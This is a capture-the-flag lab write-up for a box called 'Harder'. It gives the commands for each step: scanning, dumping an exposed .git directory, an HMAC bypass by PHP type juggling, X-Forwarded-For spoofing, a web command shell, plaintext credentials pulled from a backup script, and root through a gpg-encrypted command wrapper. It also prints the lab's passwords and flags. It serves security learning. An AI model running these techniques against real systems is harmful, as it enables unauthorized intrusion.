> Harder

# Nmap

nmap -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```bash
2/tcp  open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
22/tcp open  ssh     syn-ack OpenSSH 8.3 (protocol 2.0)
80/tcp open  http    syn-ack nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0
|_http-title: Error
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Our hint was to carefully go through the requests. OK! I used curl to llok at the request we can also use burp too!

```bash
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Tue, 29 Jun 2021 06:59:06 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept-Encoding
X-Powered-By: PHP/7.3.19
Set-Cookie: TestCookie=just+a+test+cookie; expires=Tue, 29-Jun-2021 07:59:06 GMT; Max-Age=3600; path=/; domain=pwd.harder.local; secure
```

Here we have a hostname `pwd.harder.local`. Let's add it to our localhost!

# Gobuster

gobuster dir -u http://$IP -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster/initial

```bash
Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.81.138/6374aa39-ff90-4352-bd52-4d035db05c87 => 200 (Length: 1985). To continue please exclude the status code, the length or use the --wildcard switch
```

Let's move onto pwd.harder.local

gobuster dir -u http://pwd.harder.local -w /usr/share/wordlists/dirb/common.txt -o gobuster/pwd

```bash
/.git/HEAD            (Status: 200) [Size: 23]
/index.php            (Status: 200) [Size: 19926]
```

Accessing `pwd.harder.local` we are prompted with login. Trying `admin`:`admin` we are in! But we are prompted with a message.

```
extra security in place. our source code will be reviewed soon ...
```

Now we can investigate the .git directory. Let's use GitHack ti dump files in .git directory.

python /opt/GitHack/GitHack.py http://pwd.harder.local/.git

```bash
[+] Download and parse index file ...
.gitignore
auth.php
hmac.php
index.php
[OK] hmac.php
[OK] index.php
[OK] .gitignore
[OK] auth.php
```

Looking at all files the most interesting one is hmac.php. It has a function `hash_hmac` which we can try to abuse. Looking at it's functionality it takes strings as input and if something is wrong we are given a boolean value - false. Let's take a look at our code.

```php
require("secret.php"); //set $secret var
if (isset($_GET['n'])) {
   $secret = hash_hmac('sha256', $_GET['n'], $secret);
```

We can force this function to generate false as it’s output, using the n parameter. If n is set then the $secret will contain some value. And after we get the value for $secret as false we can then bypass other if-else branch and get access to the system using h and host parameters as such.

```php
<?php
$secret = hash_hmac('sha256', 'hacker.com', false);
print($secret)
?>
```

And we got `e86f889ce1872bcb2d54e7145c1a4b4d85ee32fdf4223ac345106a212f70b2bc`. Now we can craft a url with paramteres similar to `$hm = hash_hmac('sha256', $_GET['host'], $secret);`

```
n[]=[1]
h=e86f889ce1872bcb2d54e7145c1a4b4d85ee32fdf4223ac345106a212f70b2bc
host=hacker.com
```

Accessing this url `http://pwd.harder.local/index.php?n[]=[0]&h=e86f889ce1872bcb2d54e7145c1a4b4d85ee32fdf4223ac345106a212f70b2bc&host=hacker.com` we have a login with cleartext password!

```
URL: http://shell.harder.local
Username: evs
Password(ClearText): 9FRe8VUuhFhd3GyAtjxWn0e9RfSGv7xm
```

When we try to use the above creds we are prompted with an error message.

`Your IP is not allowed to use this webservice. Only 10.10.10.x is allowed`

Let's capture the request and use X-Forwaded-For Header. Go to options of Proxy tab and add a new record to Match and Replace.

```
Type: Request Header
Match:
Replace: X-Forwarded-For: 10.10.10.100
```
And now every request is appended with `X-Forwarded-For: 10.10.10.100`. And in the webpage looks like we can run commands. 

# user flag - cat /home/evs/user.txt

```
7e88bf11a579dc5ed66cc798cbe49f76
```

I tried to get a shell using nc but failed. So looking for priv esc, I ran find command to find file user www can execute.

find / -user www => It gave us many results but one caught my eye

```
/etc/periodic/15min/evs-backup.sh
```

```bash
#!/bin/ash

# ToDo: create a backup script, that saves the /www directory to our internal server
# for authentication use ssh with user "evs" and password "U6j1brxGqbsUA$pMuIodnb$SZB4$bw14"
```

We can now ssh as evs! Let's look for some priv esc.

```bash
find / -type f -name "*.sh" 2> /dev/null

/usr/bin/findssl.sh
/usr/local/bin/run-crypted.sh
/etc/periodic/15min/evs-backup.sh
```

What is `/usr/local/bin/run-crypted.sh`?

```bash
#!/bin/sh

if [ $# -eq 0 ]
  then
    echo -n "[*] Current User: ";
    whoami;
    echo "[-] This program runs only commands which are encypted for root@harder.local using gpg."
    echo "[-] Create a file like this: echo -n whoami > command"
    echo "[-] Encrypt the file and run the command: execute-crypted command.gpg"
  else
    export GNUPGHOME=/root/.gnupg/
    gpg --decrypt --no-verbose "$1" | ash
fi
```

Looks like there may be a gpg key. Let's find it!

```bash
find / -name root@harder.local* 2>/dev/null

/var/backup/root@harder.local.pub
```

Now import!!!

```bash
gpg --import /var/backup/root@harder.local.pub
gpg: directory '/home/evs/.gnupg' created
gpg: keybox '/home/evs/.gnupg/pubring.kbx' created
gpg: /home/evs/.gnupg/trustdb.gpg: trustdb created
gpg: key C91D6615944F6874: public key "Administrator <root@harder.local>" imported
gpg: Total number processed: 1
gpg:               imported: 1
```

Now let's follow the steps to execute the commands

1. echo -n cat /root/root.txt > command
2. gpg -er root command
3. execute-crypted command.gpg

# root.txt

```
3a7bd72672889e0756b09f0566935a6c
```